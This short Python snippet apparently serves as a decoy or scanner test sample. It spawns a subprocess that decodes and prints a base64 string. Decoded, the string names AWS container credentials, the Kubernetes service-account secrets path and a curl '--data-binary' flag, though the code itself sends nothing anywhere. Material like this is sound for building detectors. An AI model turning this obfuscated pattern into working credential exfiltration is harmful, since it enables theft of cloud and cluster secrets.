import subprocess, sys
payload = 'IyAgLS1kYXRhLWJpbmFyeSAKIyAgQVdTX0NPTlRBSU5FUl9DUkVERU5USUFMUwojICAgc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50CiMgaHR0cHM6Ly8K'
subprocess.Popen([sys.executable, '-c', f"import base64; print(base64.b64decode('{payload}'))"])
